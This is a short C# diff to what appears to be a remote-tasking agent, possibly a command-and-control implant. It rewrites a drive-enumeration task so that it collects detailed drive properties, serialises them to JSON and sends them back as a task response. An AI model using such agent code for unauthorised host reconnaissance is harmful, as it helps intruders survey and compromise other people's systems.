@@ -20,14 +20,26 @@ namespace Agent
         {
             try
             {
-                var output = DriveInfo.GetDrives();
+                List<dynamic> driveInfo = new List<dynamic>();
+                var drives = DriveInfo.GetDrives();
                 StringBuilder sb = new StringBuilder();
-                foreach(var drive in output)
+                foreach(var drive in drives)
                 {
-                    sb.AppendLine("Name: " + drive.Name);
+                    dynamic dyn = new System.Dynamic.ExpandoObject();
+                    dyn.Name = drive.Name;
+                    dyn.DriveType = drive.DriveType;
+                    dyn.TotalFreeSpace = drive.TotalFreeSpace;
+                    dyn.TotalSize = drive.TotalSize;
+                    dyn.VolumeLabel = drive.VolumeLabel;
+                    dyn.IsReady = drive.IsReady;
+                    dyn.RootDirectory = drive.RootDirectory;
+                    dyn.DriveFormat = drive.DriveFormat;
+                    dyn.AvailableFreeSpace = drive.AvailableFreeSpace;
+
+                    driveInfo.Add(dyn);
                 }
 
-                //string output = JsonSerializer.Serialize(DriveInfo.GetDrives());
+                string output = JsonSerializer.Serialize(driveInfo);
                 await messageManager.AddResponse(new ResponseResult()
                 {
                     task_id = job.task.id,
